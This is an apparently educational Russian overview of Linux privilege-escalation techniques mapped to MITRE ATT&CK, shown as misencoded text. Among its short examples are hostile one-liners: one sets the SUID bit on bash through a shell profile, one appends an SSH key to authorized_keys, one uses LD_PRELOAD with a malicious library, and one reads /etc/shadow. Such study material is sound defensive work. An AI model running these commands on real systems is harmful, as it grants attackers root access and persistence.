# –û–±–∑–æ—Ä –º–µ—Ç–æ–¥–æ–≤ –∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –∞—Ç–∞–∫—É—é—â–∏—Ö –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –≤ Linux-—Å–∏—Å—Ç–µ–º–∞—Ö 


–ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π (Privilege Escalation) –≤ Linux-—Å–∏—Å—Ç–µ–º–∞—Ö ‚Äî —ç—Ç–æ –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∞–≤ —Å—É–ø–µ—Ä–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (root) –∏–ª–∏ –¥—Ä—É–≥–∏—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π. 
–ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏, –æ—à–∏–±–∫–∏ –≤ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–º –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–∏ –∏–ª–∏ —Å–ª–∞–±—ã–µ –ø–æ–ª–∏—Ç–∏–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. 

---

## I: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö –æ—à–∏–±–æ–∫
1. [**SUID/SGID-–±–∏–Ω–∞—Ä–Ω–∏–∫–∏**](#1-—ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è-suidsgid-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤)  
   - –û–ø–∏—Å–∞–Ω–∏–µ: –ò—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã —Å –ø—Ä–∞–≤–∞–º–∏ –∑–∞–ø—É—Å–∫–∞ –æ—Ç –≤–ª–∞–¥–µ–ª—å—Ü–∞.  
   - MITRE ATT&CK: [T1548.001](https://attack.mitre.org/techniques/T1548/001/)  
   - –ü—Ä–∏–º–µ—Ä—ã: `/usr/bin/find`, `/usr/bin/vim`.

2. **–ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ –ø—Ä–∞–≤–∞–º–∏ `sudo`**  
   - –û–ø–∏—Å–∞–Ω–∏–µ: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ –≤ `/etc/sudoers` –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞.  
   - MITRE ATT&CK: [T1548.003](https://attack.mitre.org/techniques/T1548/003/)  
   - –ü—Ä–∏–º–µ—Ä—ã: `sudo vi`, `sudo git`.

3. **–£—è–∑–≤–∏–º—ã–µ cron-–∑–∞–¥–∞—á–∏**  
   - –û–ø–∏—Å–∞–Ω–∏–µ: –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–¥–∞–Ω–∏–π –≤ `/etc/cron.d/` –∏–ª–∏ —Å–∫—Ä–∏–ø—Ç–æ–≤, –∑–∞–ø—É—Å–∫–∞–µ–º—ã—Ö –æ—Ç root.  
   - MITRE ATT&CK: [T1053.003](https://attack.mitre.org/techniques/T1053/003/)  
   - –ü—Ä–∏–º–µ—Ä: –ü–æ–¥–º–µ–Ω–∞ —Å–∫—Ä–∏–ø—Ç–∞ –≤ `/etc/cron.hourly/logrotate`.

---

## II: –£—è–∑–≤–∏–º–æ—Å—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è
4. [**–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —è–¥—Ä–∞ Linux**](#4-—ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è-—è–¥—Ä–∞-linux)    
   - –û–ø–∏—Å–∞–Ω–∏–µ: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—É–±–ª–∏—á–Ω—ã—Ö —ç–∫—Å–ø–ª–æ–∏—Ç–æ–≤ –¥–ª—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π —è–¥—Ä–∞.  
   - MITRE ATT&CK: [T1068](https://attack.mitre.org/techniques/T1068/)  
   - –ü—Ä–∏–º–µ—Ä—ã: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847).

5. **–£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —É—Ç–∏–ª–∏—Ç–∞—Ö**
   - –û–ø–∏—Å–∞–Ω–∏–µ: –û—à–∏–±–∫–∏ –≤ –ü–û —Å –ø—Ä–∞–≤–∞–º–∏ root (–Ω–∞–ø—Ä–∏–º–µ—Ä, `pkexec`, `sudo`).  
   - MITRE ATT&CK: [T1548.003](https://attack.mitre.org/techniques/T1548/003/)
   - –ü—Ä–∏–º–µ—Ä: CVE-2021-4034 (PwnKit), CVE-2021-3156 (Baron Samedit).

6. **–ü–æ–±–µ–≥ –∏–∑ Docker-–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞**  
   - –û–ø–∏—Å–∞–Ω–∏–µ: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–Ω—ã—Ö —Å—Ä–µ–¥–∞—Ö.  
   - MITRE ATT&CK: [T1611](https://attack.mitre.org/techniques/T1611/)  
   - –ü—Ä–∏–º–µ—Ä: CVE-2019-5736 (Escape via runc), CVE-2022-0492 (cgroups).

---

## III: –ú–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ —Å –æ–∫—Ä—É–∂–µ–Ω–∏–µ–º
7. [**–ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π PATH**](#7-–∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ-–ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π-path)  
   - –û–ø–∏—Å–∞–Ω–∏–µ: –ü–æ–¥–º–µ–Ω–∞ –ø—É—Ç–∏ –∫ –±–∏–Ω–∞—Ä–Ω–∏–∫–∞–º, –≤—ã–∑—ã–≤–∞–µ–º—ã–º —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏.  
   - MITRE ATT&CK: [T1574.007](https://attack.mitre.org/techniques/T1574/007/)
   - –ü—Ä–∏–º–µ—Ä: –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–µ–π–∫–æ–≤–æ–≥–æ `/tmp/sudo` –≤–º–µ—Å—Ç–æ –Ω–∞—Å—Ç–æ—è—â–µ–≥–æ sudo.

8. **LD_PRELOAD-–∏–Ω–∂–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ**  
   - –û–ø–∏—Å–∞–Ω–∏–µ: –ü–æ–¥–º–µ–Ω–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫ —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –æ–∫—Ä—É–∂–µ–Ω–∏—è.  
   - MITRE ATT&CK: [T1574.006](https://attack.mitre.org/techniques/T1574/006/)  
   - –ü—Ä–∏–º–µ—Ä: –í–Ω–µ–¥—Ä–µ–Ω–∏–µ –≤ `sudo` —á–µ—Ä–µ–∑ `LD_PRELOAD=/tmp/malicious.so`.

9. **–ê—Ç–∞–∫–∏ —á–µ—Ä–µ–∑ —Ñ–∞–π–ª—ã –ø—Ä–æ—Ñ–∏–ª—è –æ–±–æ–ª–æ—á–∫–∏**  
   - –û–ø–∏—Å–∞–Ω–∏–µ: –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞ –≤ —Å–∫—Ä–∏–ø—Ç—ã –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –æ–±–æ–ª–æ—á–∫–∏.  
   - MITRE ATT&CK: [T1546.004](https://attack.mitre.org/techniques/T1546/004/)
   - –ü—Ä–∏–º–µ—Ä: `echo "chmod u+s /bin/bash" >> ~/.profile`.

---

## IV: –°–µ—Ç–µ–≤—ã–µ –∞—Ç–∞–∫–∏
10. [**–ê—Ç–∞–∫–∏ –Ω–∞ —Å–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã (NFS/Samba)**](#10-–∞—Ç–∞–∫–∏-–Ω–∞-—Å–µ—Ç–µ–≤—ã–µ-—Ñ–∞–π–ª–æ–≤—ã–µ-—Å–∏—Å—Ç–µ–º—ã-nfssamba)
    - –û–ø–∏—Å–∞–Ω–∏–µ: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö –æ—à–∏–±–æ–∫ –≤ —Å–µ—Ç–µ–≤—ã—Ö —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö  
    - MITRE ATT&CK: [T1574.007](https://attack.mitre.org/techniques/T1574/007/)  
    - –ü—Ä–∏–º–µ—Ä—ã: NFS —Å `no_root_squash`, Samba —Å `writable = yes` –∏ `admin users`

11. **–ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ NFS (no_root_squash)**  
    - –û–ø–∏—Å–∞–Ω–∏–µ: –°–æ–∑–¥–∞–Ω–∏–µ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤ –Ω–∞ —É–¥–∞–ª–µ–Ω–Ω–æ–º NFS-—à–∞—Ä–µ.  
    - MITRE ATT&CK: [T1574.007](https://attack.mitre.org/techniques/T1574/007/)
    - –ü—Ä–∏–º–µ—Ä: –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ NFS —Å `no_root_squash` –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è SUID-/bin/sh.

12. **SSH-—Ç—É–Ω–Ω–µ–ª–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –∫–ª—é—á–∏**  
    - –û–ø–∏—Å–∞–Ω–∏–µ: –ù–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π SSH-–¥–æ—Å—Ç—É–ø (–¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø—É–±–ª–∏—á–Ω–æ–≥–æ –∫–ª—é—á–∞ –≤ `authorized_keys`).  
    - MITRE ATT&CK: [T1098.004](https://attack.mitre.org/techniques/T1098/004/)  
    - –ü—Ä–∏–º–µ—Ä: `echo "ssh-rsa AAAAB3Nza..." >> ~/.ssh/authorized_keys`.

---

## V: –ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–µ –º–µ—Ç–æ–¥—ã
13. [**Linux Capabilities**](#13-linux-capabilities)  
    - –û–ø–∏—Å–∞–Ω–∏–µ: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã—Ö –ø—Ä–∞–≤ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `CAP_DAC_READ_SEARCH`).  
    - MITRE ATT&CK: [T1548.001](https://attack.mitre.org/techniques/T1548/001/)  
    - –ü—Ä–∏–º–µ—Ä: `getcap -r /` –¥–ª—è –ø–æ–∏—Å–∫–∞ —É—è–∑–≤–∏–º—ã—Ö –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤.

14. **–ê—Ç–∞–∫–∏ –Ω–∞ D-Bus**  
    - –û–ø–∏—Å–∞–Ω–∏–µ: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–π —à–∏–Ω—ã (system bus) –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞.  
    - MITRE ATT&CK: [T1559.002](https://attack.mitre.org/techniques/T1559/002/)
    - –ü—Ä–∏–º–µ—Ä: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ `dbus-send` –¥–ª—è –≤—ã–∑–æ–≤–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –º–µ—Ç–æ–¥–æ–≤.

15. **–ü–µ—Ä–µ—Ö–≤–∞—Ç —Ñ–∞–π–ª–æ–≤—ã—Ö –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–æ–≤**  
    - –û–ø–∏—Å–∞–Ω–∏–µ: –î–æ—Å—Ç—É–ø –∫ –æ—Ç–∫—Ä—ã—Ç—ã–º —Ñ–∞–π–ª–∞–º –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.  
    - MITRE ATT&CK: [T1574.010](https://attack.mitre.org/techniques/T1574/010/)
    - –ü—Ä–∏–º–µ—Ä: –ß—Ç–µ–Ω–∏–µ `/etc/shadow` —á–µ—Ä–µ–∑ `/proc/<pid>/fd/<descriptor>`.

16. **–ò–Ω–∂–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–¥–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å—ã (ptrace)**  
    - –û–ø–∏—Å–∞–Ω–∏–µ: –í–Ω–µ–¥—Ä–µ–Ω–∏–µ —à–µ–ª–ª-–∫–æ–¥–∞ –≤ —Ä–∞–±–æ—Ç–∞—é—â–∏–µ –ø—Ä–æ—Ü–µ—Å—Å—ã.  
    - MITRE ATT&CK: [T1055](https://attack.mitre.org/techniques/T1055/)
    - –ü—Ä–∏–º–µ—Ä: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ `gdb` –¥–ª—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø–∞–º—è—Ç–∏.

---

## VI: –°–æ—Ü–∏–∞–ª—å–Ω–∞—è –∏–Ω–∂–µ–Ω–µ—Ä–∏—è
17. **–§–∏—à–∏–Ω–≥ —á–µ—Ä–µ–∑ —Å–∫—Ä–∏–ø—Ç—ã**  
    - –û–ø–∏—Å–∞–Ω–∏–µ: –ó–∞–ø—É—Å–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤ –ø–æ–¥ –≤–∏–¥–æ–º –ª–µ–≥–∏—Ç–∏–º–Ω—ã—Ö.  
    - MITRE ATT&CK: [T1204.002](https://attack.mitre.org/techniques/T1204/002/)
    - –ü—Ä–∏–º–µ—Ä: `./update.sh`, –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä—É—é—â–∏–π `/etc/passwd`.

---

---


# 1. –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SUID/SGID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤

**SUID** (Set User ID) –∏ **SGID** (Set Group ID) ‚Äî —ç—Ç–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ –±–∏—Ç—ã –¥–æ—Å—Ç—É–ø–∞, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º—ã–µ –Ω–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã –≤ Unix/Linux-—Å–∏—Å—Ç–µ–º–∞—Ö. 
–≠—Ç–∏ –±–∏—Ç—ã –ø–æ–∑–≤–æ–ª—è—é—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É –æ—Ç –∏–º–µ–Ω–∏ –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Ñ–∞–π–ª–∞ (SUID) –∏–ª–∏ –æ—Ç –∏–º–µ–Ω–∏ –≥—Ä—É–ø–ø—ã —Ñ–∞–π–ª–∞ (SGID), –¥–∞–∂–µ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–∞–ø—É—Å–∫–∞—é—â–∏–π —Ñ–∞–π–ª, 
–Ω–µ –∏–º–µ–µ—Ç —Ç–∞–∫–∏—Ö –ø—Ä–∞–≤. –í UNIX‚Äë–ø–æ–¥–æ–±–Ω—ã—Ö –û–° –∫–∞–∂–¥–æ–µ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å –ø—Ä–∞–≤–∞–º–∏ —Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä—ã–π –µ–≥–æ –≤—ã–∑–≤–∞–ª. –ë–∏—Ç—ã SUID –∏ SGID –ø–æ–∑–≤–æ–ª—è—é—Ç –≤—Ä–µ–º–µ–Ω–Ω–æ ¬´–ø–æ–¥–º–µ–Ω–∏—Ç—å¬ª —ç—Ç–∏ –ø—Ä–∞–≤–∞:

- **SUID-–±–∏—Ç** - –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º SUID‚Äë–±–∏—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–ª—É—á–∞–µ—Ç —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–π UID (eUID) —Ñ–∞–π–ª–∞‚Äë–≤–ª–∞–¥–µ–ª—å—Ü–∞, –∞ –Ω–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä—ã–π –µ–≥–æ –∑–∞–ø—É—Å—Ç–∏–ª.
  - –§–ª–∞–≥ `-rwsr-xr-x` –≤ –ø—Ä–∞–≤–∞—Ö —Ñ–∞–π–ª–∞
  - –ü—Ä–∏–º–µ—Ä: `-rwsr-xr-x 1 root root`
- **SGID-–±–∏—Ç** - –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º SGID‚Äë–±–∏—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–ª—É—á–∞–µ—Ç —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–π GID (eGID) –Ω–∞ –≥—Ä—É–ø–ø—É‚Äë–≤–ª–∞–¥–µ–ª—å—Ü–∞ —Ñ–∞–π–ª–∞, –∞ –Ω–µ –Ω–∞ –≥—Ä—É–ø–ø—É-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä—ã–π –µ–≥–æ –∑–∞–ø—É—Å—Ç–∏–ª: 
  - –§–ª–∞–≥ `-rwxr-sr-x`
  - –ü—Ä–∏–º–µ—Ä: `-rwxr-sr-x 1 root staff`
- **UID/GID** ‚Äî –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è/–≥—Ä—É–ø–ø—ã –≤ –û–°.
- **eUID/eGID** ‚Äî ¬´—ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–µ¬ª –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã, –æ–ø—Ä–µ–¥–µ–ª—è—é—Ç —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞.

**–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:**
1. –ï—Å–ª–∏ SUID‚Äë–±–∏–Ω–∞—Ä–Ω–∏–∫ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç `root`, —Ç–æ –æ–Ω –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è —Å `euid=0` (–ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ —Å—É–ø–µ—Ä–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è), –¥–∞–∂–µ –µ—Å–ª–∏ –∑–∞–ø—É—â–µ–Ω –æ—Ç –∏–º–µ–Ω–∏ –æ–±—ã—á–Ω–æ–≥–æ —é–∑–µ—Ä–∞.
2. –õ—é–±–∞—è –æ—à–∏–±–∫–∞ –≤ SUID‚Äë–ø—Ä–æ–≥—Ä–∞–º–º–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–π –≤—ã–∑–æ–≤ `system()`, –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—É—Ç–µ–π, –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤) —Å—Ä–∞–∑—É –¥–∞—ë—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–ª—É—á–∏—Ç—å `root`‚Äë–¥–æ—Å—Ç—É–ø.  
3. –í —Å–∏—Å—Ç–µ–º–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –º–Ω–æ–∂–µ—Å—Ç–≤–æ SUID/SGID‚Äë—Ñ–∞–π–ª–æ–≤, —á–∞—Å—Ç—å –∏–∑ –∫–æ—Ç–æ—Ä—ã—Ö –¥–∞–≤–Ω–æ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è, –Ω–æ –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç —Å—É—â–µ—Å—Ç–≤–æ–≤–∞—Ç—å.  

---

## MITRE ATT&CK

**[T1548.001]**  
**Abuse Elevation Control Mechanism: Setuid and Setgid**  
üîó https://attack.mitre.org/techniques/T1548/001/

–ê—Ç–∞–∫–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º—ã —Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–º–∏ —Ñ–ª–∞–≥–∞–º–∏ SUID/SGID, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è-–≤–ª–∞–¥–µ–ª—å—Ü–∞ (—á–∞—Å—Ç–æ root).
–ï—Å–ª–∏ —Ç–∞–∫–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç –∫–æ–º–∞–Ω–¥—ã, –ø—É—Ç–∏ –∏–ª–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –∏—Ö –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –∑–∞–ø—É—Å–∫–∞ shell –∏–ª–∏ –∫–æ–¥–∞ —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏.

### –≠—Ç–∞–ø—ã –∞—Ç–∞–∫–∏ [T1548.001]

#### 1. [TA0001] ‚Äì Initial Access (–ù–∞—á–∞–ª—å–Ω—ã–π –¥–æ—Å—Ç—É–ø)
> –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.  

–ê—Ç–∞–∫—É—é—â–∏–π –ø–æ–ª—É—á–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ —Å–∏—Å—Ç–µ–º–µ –ø–æ–¥ –æ–±—ã—á–Ω–æ–π —É—á—ë—Ç–Ω–æ–π –∑–∞–ø–∏—Å—å—é (—á–µ—Ä–µ–∑ —ç–∫—Å–ø–ª–æ–π—Ç, —É–∫—Ä–∞–¥–µ–Ω–Ω—ã–µ —É—á—ë—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, —Ñ–∏—à–∏–Ω–≥ –∏ —Ç.–¥.).

---

#### 2. [TA0007] ‚Äì Discovery (–†–∞–∑–≤–µ–¥–∫–∞)
> –ü–æ–∏—Å–∫ SUID/SGID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤, –∏–∑—É—á–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã

- **[T1087.001]** ‚Äì Local Accounts
  * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ, –æ—Ç —á—å–µ–≥–æ –∏–º–µ–Ω–∏ —Ä–∞–±–æ—Ç–∞–µ—Ç —Å–µ—Å—Å–∏—è.
  * –ê–Ω–∞–ª–∏–∑ —Å–ø–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: `cat /etc/passwd`.

- **[T1033]** ‚Äì System Owner/User Discovery
  * –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–µ–∫—É—â–∏—Ö –ø—Ä–∞–≤: `id`, `whoami`.

- –ü–æ–∏—Å–∫ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —Ç–æ—á–µ–∫ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π (`find`)

---

#### 3. [TA0004] ‚Äì Privilege Escalation (–ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)
> –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è root

- **[T1548.001]** ‚Äì Setuid and Setgid
  * –í—ã—è–≤–ª–µ–Ω–∏–µ –∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤.
  * –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–æ–¥–º–µ–Ω—ã –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π `PATH`, LD_PRELOAD, –∏–ª–∏ –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–≥–æ shell –≤ –±–∏–Ω–∞—Ä–Ω–∏–∫–∞—Ö (–Ω–∞–ø—Ä–∏–º–µ—Ä, `nmap`, `python`, `vim`).

---

#### 4. [TA0002] ‚Äì Execution (–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ)
> –ó–∞–ø—É—Å–∫ shell –∏–ª–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –æ—Ç root

- **[T1059.004]** ‚Äì Unix Shell
  * –ó–∞–ø—É—Å–∫ shell —Å root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏

---

#### 5. [TA0003] ‚Äì Persistence (–ó–∞–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –≤ —Å–∏—Å—Ç–µ–º–µ)
> –î–æ–±–∞–≤–ª–µ–Ω–∏–µ root-–¥–æ—Å—Ç—É–ø–∞ (—á–µ—Ä–µ–∑ crontab, ssh-–∫–ª—é—á–∏)

- –£—Å—Ç–∞–Ω–æ–≤–∫–∞ root SSH-–∫–ª—é—á–∞
- –°–æ–∑–¥–∞–Ω–∏–µ —Ä—É—Ç–æ–≤–æ–≥–æ cron-–∑–∞–¥–∞–Ω–∏—è

---

#### 6. [TA0010] ‚Äì Exfiltration (–≠–∫—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è)
> –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö, —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –±—ç–∫–¥–æ—Ä–æ–≤ –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã –∫–∞–∫ —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ –≤ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É

---

### –ü—Ä–∏–º–µ—Ä—ã –∏–∑ –ø—Ä–∞–∫—Ç–∏–∫–∏:

#### [GTFOBins]
üîó https://gtfobins.github.io
